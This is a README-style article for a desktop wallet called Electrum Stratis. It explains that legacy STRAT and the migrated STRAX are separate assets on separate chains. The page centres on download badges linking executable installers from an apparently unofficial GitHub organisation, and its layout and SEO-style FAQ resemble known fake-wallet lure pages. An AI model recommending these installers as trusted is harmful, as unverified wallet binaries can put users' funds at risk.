![Electrum-Stratis](assets/banner-article.png)

# STRAT is not STRAX: what the rename changed, and which one this wallet holds

<p align="center">Two chains, two assets, one shared brand name</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

STRAT and STRAX are different assets on different chains, and Electrum Stratis holds only the legacy one. The old token became STRAT, the migration moved value into STRAX on a new chain, and a later rebase changed its units again. A wallet built for the legacy chain cannot hold STRAX, and no setting makes it try. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you see | What it means | What to do |
|---|---|---|
| An exchange lists a Stratis asset with an unfamiliar suffix | Legacy assets are often suffixed to distinguish them | Check which chain the ticker belongs to |
| Coins sent to this wallet never arrive | They were sent as STRAX on another chain | See [an Electrum Stratis balance that is missing](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md) |
| The wallet shows a legacy-chain banner | It is telling you which chain it serves | Nothing; it is correct |
| A price site shows one number for "Stratis" | The price is quoted for the current asset | Do not read it as this wallet's balance |

</div>

The wallet's banner exists so that this is stated rather than discovered: it names the chain it serves and the asset it does not hold, and it can be dismissed and found again.

## Why it happens

A chain migration is a new network with a new genesis, and the old chain keeps running with its old rules. Wallets are bound to a chain's parameters - address prefixes, key formats, the coinbase maturity - so a wallet compiled for the legacy chain can only ever see the legacy chain. The migration in 2020 created STRAX on a new chain; the rebase in 2024 changed how STRAX is denominated again. None of that changes what a legacy wallet does.

That is why the name "Stratis" is ambiguous in a way that costs people money. Search results, price pages and exchange listings mostly describe the current asset, while the wallet in front of you describes the old one. The two are not interchangeable and there is no bridge inside this software.

The maintained build, current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), states which chain it serves rather than letting a user infer it from a balance.

## Fix

1. **Identify the asset you actually hold.** Check the address format and the chain a block explorer shows the coins on. Legacy addresses look different from current ones, and the explorer names the chain.
2. **Match the wallet to the asset.** Legacy STRAT belongs in a legacy wallet such as [Electrum Stratis and the seedless Qt wallet](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/qt-wallet-has-no-seed.md); STRAX needs a wallet for the current chain. This wallet is the first, not the second.
3. **Do not send across.** A transfer to an address of the wrong chain does not arrive late; it does not arrive. Confirm the chain before sending, every time.
4. **Keep the history straight when reading about the project.** Statements about STRAX, its units and its network describe a different asset from the one this wallet holds, even when they use the same brand name.
5. **Record which wallet holds what.** One line per wallet: asset, chain, date. It prevents the confusion that sending to the wrong chain turns into a loss.

Where you buy or sell either asset is an exchange question, not a wallet question: this software has no built-in exchange, no fiat on-ramp and no price feed. Treat any "buy here" prompt inside a wallet as hostile.

## If that did not work

If coins were sent to an address on the wrong chain, there is no recovery inside this wallet and no setting that reveals them. The transaction is valid on the chain it was broadcast to, and it stays there.

If an explorer shows a balance the wallet does not, confirm that the explorer is showing the legacy chain rather than the current one. An explorer set to the wrong network produces exactly this mismatch.

If a third party offers to "convert" coins between chains for a fee, that is a custody transaction, not a technical one: you are handing over the coins and hoping for a return. No wallet can make that safe.

## Prevention

- Check the chain before every send, not the ticker.
- Keep legacy and current assets in separate wallets and label them.
- Ignore price pages when reading a legacy balance; they quote a different asset.
- Treat any in-wallet offer to buy, sell or swap as suspect.
- When in doubt, send a small test amount first.
- Label balances by chain in your own notes, so a shared name never decides what you think you hold.

## FAQ

### Where can I buy Stratis?

Through an exchange that lists the asset you want, and it matters which one: legacy STRAT and current STRAX are listed separately where they are listed at all. This wallet does not buy, sell or convert anything, and it has no price feed.

### Is STRAX the old Stratis or a new coin?

STRAX is the asset on the chain that replaced the legacy one; the migration created it in 2020 and a later rebase changed its units. The legacy chain, and the STRAT on it, is what this wallet serves. They share a brand and nothing else technically.

### Can you cash out a crypto wallet?

Not from inside the wallet: cashing out means sending coins to an exchange or a broker that trades them for currency. The wallet signs the transfer and nothing more. Choose the venue yourself, and check that it accepts the exact asset and chain you hold.

### My wallet says "Stratis [Old]" somewhere. Is something wrong?

No. Aggregators label the legacy asset that way to distinguish it from the current one. It is a naming convention, not a warning about the wallet.

<!-- DOWNLOAD-BLOCK -->

The rename created two assets with one history: STRAT on the legacy chain, STRAX on the chain that replaced it, connected by a conversion that has since closed. A wallet that holds one cannot spend the other, and an address from one is meaningless on the other. Confusing them is not a display problem; it is the difference between a balance you can move and one you cannot.

## Related articles

- [What Electrum Stratis actually is](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/what-this-wallet-is.md)
- [Where to download the current build](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-to-get-the-current-build.md)
- [Why is my balance missing? Three causes](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
